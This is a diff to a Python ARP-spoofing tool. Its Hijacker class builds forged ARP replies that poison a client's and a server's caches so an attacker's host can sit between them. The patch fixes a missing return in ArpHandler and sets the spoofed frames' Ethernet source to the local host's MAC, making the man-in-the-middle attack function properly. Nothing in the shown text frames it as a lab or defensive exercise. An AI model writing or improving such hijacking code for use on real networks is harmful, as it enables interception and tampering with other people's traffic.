@@ -54,6 +54,7 @@ class ArpHandler:
         info_string += f'\nsnd_ip_addr: {self.snd_ip_addr}'
         info_string += f'\ntgt_hw_addr: {self.tgt_hw_addr}'
         info_string += f'\ntgt_ip_addr: {self.tgt_ip_addr}'
+        return info_string
 
     def send(self):
         arp_msg = self.__compile_arp_message()
@@ -277,14 +278,14 @@ class Hijacker:
             server_arp_ip = self.server_gateway.ip_addr
             server_arp_mac = self.server_gateway.mac_addr
         self.client_spoofer.operation = 2
-        self.client_spoofer.src_addr = server_arp_mac
+        self.client_spoofer.src_addr = self.local_host.mac_addr
         self.client_spoofer.dst_addr = client_arp_mac
         self.client_spoofer.snd_hw_addr = server_arp_mac
         self.client_spoofer.snd_ip_addr = server_arp_ip
         self.client_spoofer.tgt_hw_addr = server_arp_mac
         self.client_spoofer.tgt_ip_addr = server_arp_ip
         self.server_spoofer.operation = 2
-        self.server_spoofer.src_addr = client_arp_mac
+        self.server_spoofer.src_addr = self.local_host.mac_addr
         self.server_spoofer.dst_addr = server_arp_mac
         self.server_spoofer.snd_hw_addr = client_arp_mac
         self.server_spoofer.snd_ip_addr = client_arp_ip
